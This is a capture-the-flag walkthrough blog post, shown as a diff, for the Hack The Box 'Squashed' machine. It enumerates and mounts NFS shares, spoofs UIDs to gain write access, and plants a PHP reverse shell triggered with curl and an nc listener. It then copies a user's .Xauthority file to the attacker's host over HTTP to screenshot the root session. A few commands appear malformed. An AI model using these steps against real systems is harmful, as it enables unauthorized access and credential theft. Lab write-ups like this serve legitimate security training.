@@ -1,0 +1,186 @@
+export const meta = {
+    slug: "squashed",
+    title: "Squashed",
+    description: "A walkthrough in the Squashed machine provided by polarbearer and C4rm3l0",
+    category: "walkthrough",
+    author: "Samuele Sciatore",
+    date: "2022-12-6",
+    tags: ["hacking", "pentesting", "hackthebox"]
+}
+
+![image of Squashed machine](/assets/blog/posts/squashed/squashed.png)
+
+Creator: [polarbearer &](https://app.hackthebox.com/users/159204)[C4rm3l0](https://app.hackthebox.com/users/458049)
+# Nmap
+
+```bash title="localhost"
+nmap -sC -sV -A squashed.htb
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-10 22:21 CET
+Nmap scan report for squashed.htb (10.10.11.191)
+Host is up (0.11s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
+|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
+|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Built Better
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      43635/tcp6  mountd
+|   100005  1,2,3      43975/tcp   mountd
+|   100005  1,2,3      50318/udp6  mountd
+|   100005  1,2,3      52795/udp   mountd
+|   100021  1,3,4      34717/tcp   nlockmgr
+|   100021  1,3,4      37907/tcp6  nlockmgr
+|   100021  1,3,4      42565/udp6  nlockmgr
+|   100021  1,3,4      50712/udp   nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+2049/tcp open  nfs_acl 3 (RPC #100227)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 73.50 seconds
+```
+
+## Analyze port 111
+
+We notice that NFS is a service running on port 111, so by searching online we can find on HackTricks [this article](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind#rpcbind-+-nfs) .
+
+[Reading this article](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting) we can learn about the NFS service.
+
+### Enumeration
+
+```bash title="localhost"
+showmount -e squashed.htb
+Export list for squashed.htb:
+/home/ross    *
+/var/www/html *
+```
+
+## Mount
+
+Now we will mount `/home/ross` dir to our computer.
+
+```bash title="localhost"
+cd /tmp
+mkdir mounted
+sudo -t nfs mount squashed.htb:/home/ross /tmp/mounted
+```
+
+Exploring files we can find in `/Documents` a file called `Password.kdbx` but we cannot decrypt this file cause John does not support his version.
+
+So we mount the `/var/www/html` directory.
+
+```bash title="localhost"
+cd /tmp
+mkdir mounted2
+sudo -t nfs mount squashed.htb:/var/www/html /tmp/mounted2
+```
+
+We can see that we have no permissions to open this folder.
+
+```bash title="localhost"
+cd mounted2
+bash: cd: mounted2: Permission denied
+ls -l mounted2
+ls: cannot access 'mounted2/index.html': Permission denied
+ls: cannot access 'mounted2/images': Permission denied
+ls: cannot access 'mounted2/css': Permission denied
+ls: cannot access 'mounted2/js': Permission denied
+total 0
+?????????? ? ? ? ?            ? css
+?????????? ? ? ? ?            ? images
+?????????? ? ? ? ?            ? index.html
+?????????? ? ? ? ?            ? js
+```
+
+Now by running nmap `sudo nmap squashed.htb --script nfs-ls` we can see that we need a user with uid `2017`.
+
+So we will create this user:
+
+```bash title="squashed.htb"
+sudo useradd pewpew
+sudo usermod -u 2017 pewpew
+sudo groupmod -g 2017 test
+su pewpew
+```
+
+Now we can create a new file in the shared folder called `reverse.php` that will contain code to open a reverse shell[ generator](https://www.revshells.com/).
+
+Now we start a listener with `nc -lvp 9999` and using curl we will trigger the reverse shell `curl squashed.htb/reverse.php`.
+
+## User flag
+
+```bash title="squashed.htb"
+cat /home/alex/user.txt
+b***************6
+```
+
+# Privilege Escalation
+
+By inspection the system we cannot find a lot of things, but we can see that user `ross` is logged in with the command `w`.
+
+So we return to inspect the shared folder `/home/ross` and we can find a `.Xauthority` file.
+
+So to read this file we have to create a new user with id `1001`
+
+```bash title="squashed.htb"
+sudo useradd test
+sudo usermod -u 1001
+sudo groupmod -g 1001
+su test
+```
+
+Now we can read the file and upload it on a server by which we can download the file from the client.
+
+```bash title="squashed.htb"
+cat /mnt/ross_folder/.Xauthority | base64 > /tmp/xauth
+cd /tmp && python3 -m http.server
+```
+
+## Login using Xauth
+
+Now on the target we go to the `/tmp` dir and download the xauth file.
+
+```bash title="localhost"
+cd /tmp
+wget 10.10.14.146:8000/xauth
+```
+
+Now we can change our session with command `XAUTHORITY=/tmp/xauth`
+
+We will use a command to take a screenshot of the root user (ross).
+
+```bash title="localhost"
+xwd -root -screen -silent -display :0 > out.xwd
+```
+
+Now move this image to `/var/www/html` and see it from our pc using nfs.
+
+```bash title="localhost"
+mv ./out.xwd /var/www/html
+```
+
+From this screen we get the root password by which we can log in as root. `c********A`.
+
+## Root Flag
+```bash title="squashed.htb"
+cat /root/root.txt
+5**********d
+```
